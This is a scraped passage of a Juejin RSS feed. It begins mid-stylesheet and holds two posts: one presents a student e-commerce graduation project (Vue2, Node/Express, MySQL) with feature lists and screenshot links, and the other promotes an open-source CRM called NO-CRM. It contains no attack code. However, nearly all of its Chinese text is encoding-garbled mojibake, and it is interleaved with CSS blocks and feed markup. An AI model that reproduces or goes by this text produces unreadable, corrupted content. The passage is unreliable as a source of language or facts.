7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å£°æ˜ï¼Œè¯¥é¡¹ç›®ï¼Œå¯ä½œä¸ºè®¡ç®—æœºçš„æ¯•ä¸šè®¾è®¡ï¼›</h3>
<h2 data-id="heading-1">æ¶æ„</h2>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">- å‰ç«¯ï¼švue2 + vuex + vueRouter + vuecli + axios + sass + less</span>
<span class="hljs-deletion">- åç«¯ï¼š node + express + ä¸­é—´ä»¶</span>
<span class="hljs-deletion">- æ•°æ®åº“ï¼šMySQL 5.7</span>
</code></pre>
<h2 data-id="heading-2">åŠŸèƒ½å¦‚ä¸‹</h2>
<h3 data-id="heading-3">å‰å°åŠŸèƒ½</h3>
<ul>
<li>æ³¨å†Œã€ç™»å½•ï¼ˆè´¦å·ï¼ŒéªŒè¯ç ç™»å½•æ³¨å†Œï¼‰</li>
<li>å•†å“
<ul>
<li>å•†å“åˆ†ç±»</li>
<li>å•†å“æœç´¢</li>
<li>ç®€å•å±•ç¤ºå•†å“</li>
<li>æŸ¥çœ‹å•†å“è¯¦æƒ…</li>
<li>å•†å“è¯„è®ºï¼Œè¿½åŠ è¯„è®º</li>
</ul>
</li>
<li>åˆ†é¡µåŠŸèƒ½</li>
<li>å®šä½ ã€è‡ªä¸»é€‰æ‹©æ‰€åœ¨åŸå¸‚</li>
<li>è´­ç‰©è½¦åŠŸèƒ½
<ul>
<li>åŠ å…¥è´­ç‰©è½¦</li>
<li>è´­ç‰©è½¦å•†å“æ•°é‡å¢å‡</li>
<li>æ¸…ç©ºè´­ç‰©è½¦</li>
<li>å•†å“ç»“ç®—</li>
</ul>
</li>
<li>æ”¯ä»˜åŠŸèƒ½</li>
<li>è®¢å•é¡µé¢
<ul>
<li>ä¸‹å•æœªæ”¯ä»˜ï¼ˆè¶…æ—¶ç®¡ç†å‘˜å¯åˆ é™¤è®¢å•ï¼‰</li>
<li>ä¸‹å•æœªå‘è´§</li>
<li>ä¸‹å•ï¼Œæ”¶è´§å®Œæˆåï¼Œå¯è¯„è®ºï¼Œè¿½åŠ è¯„è®º</li>
</ul>
</li>
<li>æœç´¢å•†å“</li>
<li>ç”¨æˆ·ä¸ªäººä¸­å¿ƒ
<ul>
<li>ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯</li>
<li>ä¿®æ”¹æ‰‹æœºå·</li>
<li>ä¿®æ”¹å¯†ç </li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">åå°åŠŸèƒ½</h3>
<ul>
<li>ç™»å½•</li>
<li>æŸ¥çœ‹å•†å“ä¿¡æ¯</li>
<li>å•†å“ä¸Šæ¶</li>
<li>ç”¨æˆ·ç®¡ç†</li>
<li>å•†å“çš„å¢åˆ æ”¹æŸ¥</li>
<li>è®¢å•ç®¡ç†</li>
<li>è¯„è®ºç®¡ç†</li>
</ul>
<h2 data-id="heading-5">é¡¹ç›®æŒ‘é€‰åŠŸèƒ½çš„è¿è¡Œæ•ˆæœ</h2>
<h3 data-id="heading-6">å‰å°åŠŸèƒ½æ•ˆæœ</h3>
<ol>
<li>ç™»å½•æ³¨å†Œé¡µé¢
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5962c5842a2d45c296a9b15f7aaf145a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=rZ7mcXvqF88hYgHBcvFwjclFkTc%3D" alt="image.png" loading="lazy"/></li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d22359b7a79f4b05b11189bd494ed2e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=BAgRI%2Bg5s23TRaz3que7oJZl8gk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/701c00859f6b44acac8799b5e29ae6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=oUmz6bVLNypR4tldFDT%2BXsda%2FCc%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>é¦–é¡µ</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cd5d1961a29459d999cc126e6b9f657~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=fvxiWDMu4bQyKajpkYU1OyCuCnk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78402a6a90c9406999c72943bd2435e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=ijeBRjDM%2BzjueRZzr%2BoSgGEJS2M%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>æœç´¢</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59a126dd456642e5bc518d2492dfe367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=Y8nXtOkMuE9Uz9LD4z4tfREdmqI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c45620d104e546d68004b204ad85732f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=AJwaKJ0gKvIKpJLpmvl4uid5Jl4%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>è´­ç‰©è½¦</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c49266aa38034c55b0b5b4b497b83c3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=Tvh5InpK8y%2BNjw97kzyryGumpDc%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>æ”¯ä»˜åŠŸèƒ½</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a72e0a24523148009dab1cbaf70228f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=ak0vCz3wnc8uZuTHrGjF2qO9bgY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80154be22849483cacc12d988e783a1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=%2BePdyNa4DAZYMaco3fdDv4FtDtA%3D" alt="image.png" loading="lazy"/></p>
<ol start="6">
<li>è®¢å•åŠŸèƒ½</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9ad69346ba948429c6ce7cba7f820f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=qxfHBc%2BKkXZkbWq72RLGchyqbDM%3D" alt="image.png" loading="lazy"/></p>
<p>ã€‚ã€‚ã€‚ã€‚ å‰å°åŠŸèƒ½æŒ‘é€‰æ¼”ç¤ºï¼Œå°±æ¼”ç¤ºåˆ°è¿™</p>
<h3 data-id="heading-7">åå°åŠŸèƒ½æ•ˆæœ</h3>
<ol>
<li>ç™»å½•</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/267a067be2674e858e54bc20239e91a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=TMnQwTJsud7orPznOaVbBbVkM9A%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>é¦–é¡µ</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/230fabe25b0b4c6c994eeaec0d67e394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=BysnpyVgLi2oSmXLJ16nKd%2BPeo8%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>å•†å“ä¸Šæ¶</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dbd158c50bd4d2aa1e6477f9391a6f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=KH69%2FUiBiiFCAWv3mpgW9nSqTO8%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>è®¢å•ç®¡ç†</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd15f4ccb92446993f29ffdff5923b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=TvYrdWkWsrGbCmM2S4M4v5RpTAE%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>è¯„è®ºç®¡ç†</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d38d61c2a8c48faa4d7c2e8ac03e33c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=Hgne9xzexow7Rc%2FjSJBDLBWmtOo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">ä»£ç å±•ç¤º</h3>
<h3 data-id="heading-9">å‰ç«¯ä»£ç </h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a1575353b0b40a0886f64594e2bcac9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=gg6mMS99Kt6BzuF1gKVa14AfhLI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">åç«¯ä»£ç </h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93ba8b650aea48fcad15da176fc6014a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=3bUXiBkgEi8teRgbFv02PPm2o%2FE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-11">mysql æ•°æ®è¡¨</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d791ad1a823d45e59f02809a6442f378~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=t3gmDQH7nM2%2Bax2aPgF8Sb%2F%2FQkQ%3D" alt="image.png" loading="lazy"/></p>
<p>å½“ç„¶å•¦ï¼Œå¦‚æœæœ‰å¤§ä½¬çœ‹åˆ°ï¼Œè§‰å¾—æˆ‘çš„é¡¹ç›®æ¯”è¾ƒç®€å•ï¼Œå‹¿å–·ï¼ï¼ï¼ï¼ˆéœ€è¦æºç ï¼Œè¿œç¨‹æŒ‡å¯¼ï¼Œå¯ç§èŠï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è€—æ—¶ä¸€å‘¨ï¼Œæˆ‘æŠŠå¯è§†åŒ–+é›¶ä»£ç +AIèå…¥åˆ°äº†CRMç³»ç»Ÿï¼Œä½¿ç”¨ä½“éªŒè¶…é…·ï¼]]></title>    <link>https://juejin.cn/post/7577171133444620324</link>    <guid>https://juejin.cn/post/7577171133444620324</guid>    <pubDate>2025-11-27T07:10:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577171133444620324" data-draft-id="7576955345379164223" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è€—æ—¶ä¸€å‘¨ï¼Œæˆ‘æŠŠå¯è§†åŒ–+é›¶ä»£ç +AIèå…¥åˆ°äº†CRMç³»ç»Ÿï¼Œä½¿ç”¨ä½“éªŒè¶…é…·ï¼"/> <meta itemprop="keywords" content="JavaScript,GitHub,Vue.js"/> <meta itemprop="datePublished" content="2025-11-27T07:10:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾å°å¤•"/> <meta itemprop="url" content="https://juejin.cn/user/3808363978429613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è€—æ—¶ä¸€å‘¨ï¼Œæˆ‘æŠŠå¯è§†åŒ–+é›¶ä»£ç +AIèå…¥åˆ°äº†CRMç³»ç»Ÿï¼Œä½¿ç”¨ä½“éªŒè¶…é…·ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363978429613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾å°å¤•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:10:52.000Z" title="Thu Nov 27 2025 07:10:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘èŠ±äº†ä¸€å‘¨æ—¶é—´ï¼Œé…åˆAIï¼Œæ‰“ç£¨äº†ä¸€æ¬¾CRMå®¢æˆ·ç®¡ç†ç³»ç»Ÿâ€”â€”NO-CRMã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c117b63f38154aa9bc0f4b268f3d3d4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=6iAor9C73AnGvy449wYiZhA%2FmVQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®¢æˆ·å…³ç³»ç®¡ç†ï¼ˆCRMï¼‰ç³»ç»Ÿçš„æ ¸å¿ƒä»·å€¼åœ¨äº<strong>ä»¥å®¢æˆ·ä¸ºä¸­å¿ƒï¼Œé€šè¿‡æ•°å­—åŒ–æ‰‹æ®µæ‰“é€š â€œè·å®¢ - è½¬åŒ– - ç•™å­˜ - å¤è´­ - æ¨èâ€ å…¨é“¾è·¯</strong>ï¼Œå¸®åŠ©ä¼ä¸šé™æœ¬å¢æ•ˆã€æå‡å®¢æˆ·ä»·å€¼ä¸å¸‚åœºç«äº‰åŠ›ã€‚</p>
<ul>
<li>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fno-crm.flowmix.cn%2F" target="_blank" title="http://no-crm.flowmix.cn/" ref="nofollow noopener noreferrer">no-crm.flowmix.cn/</a></li>
<li>æœ¬åœ°å®‰è£…å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2FNO-CRM" target="_blank" title="https://github.com/MrXujiang/NO-CRM" ref="nofollow noopener noreferrer">github.com/MrXujiang/Nâ€¦</a></li>
</ul>
<p>åšè¿™æ¬¾CRMç³»ç»Ÿä¹‹å‰ï¼Œæˆ‘ç ”ç©¶äº†å¸‚é¢ä¸Šæ¯”è¾ƒæµè¡Œçš„å•†ä¸šäº§å“ï¼Œç»“åˆäº†æˆ‘ä¹‹å‰è®¾è®¡çš„é›¶ä»£ç ç†å¿µï¼Œåšäº†ä¸€æ¬¾ä»å®¢æˆ·ç®¡ç†ï¼Œæ•°æ®åˆ†æï¼Œåˆ°ç”¨æˆ·æ”¶é›†ï¼Œå†åˆ°å·¥ä½œæµè®¾è®¡çš„ä¸€æ•´å¥—è§£å†³æ–¹æ¡ˆï¼Œå¤§å®¶å¯ä»¥ç›´æ¥éƒ¨ç½²ä½¿ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33b2afc6a8844ac098c9552acecbb0c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=MKR7V9gDB4RmWgBzQm6WNXsTYCw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨CRMä¸­åœ¨çº¿è®¾è®¡å„ç§æ”¶é›†è¡¨å•ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be045167b681424381e1a66e54134b77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=7sh0eYgE1BhlO4j%2BLnK%2FSfuyGpc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åå°è‡ªå¸¦äº†è¡¨å•æ”¶é›†å’Œç»Ÿè®¡åˆ†æåŠŸèƒ½ï¼ŒåŒæ—¶è¿˜èƒ½è®¾è®¡å·¥ä½œæµï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcba1cbe5c0247ddb07958dbe856aa4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=VRUrDsrnfa0w3SCltbOj6c8Od08%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¹¶è‡ªå®šä¹‰å·¥ä½œæµå’Œå®¡æ‰¹æ¡ä»¶ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5a6015a6c9f422dbd941bbe5e45f514~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=OrpglDKS7MHvBGbf8txY%2FczQvgY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å½“ç„¶è¿˜æœ‰AIåˆ†ææ¨¡å—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡AIå¸®æˆ‘ä»¬åˆ†æçº¿ç´¢æ•°æ®ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56a3d5c91c144f98bd0b6df8aa03390a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=oXMKrHRAHlbx9ddAAiT2MY6RMLk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘å·²ç»æŠŠè¿™ä¸ªCRMç³»ç»Ÿé•œåƒå¼€æºï¼Œå¤§å®¶å¯ä»¥ç›´æ¥å®‰è£…æˆ–è€…éƒ¨ç½²åˆ°æœåŠ¡å™¨ç›´æ¥ä½¿ç”¨ã€‚</p>
<ul>
<li>æœ¬åœ°å®‰è£…å¼€æºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2FNO-CRM" target="_blank" title="https://github.com/MrXujiang/NO-CRM" ref="nofollow noopener noreferrer">github.com/MrXujiang/Nâ€¦</a></li>
</ul>
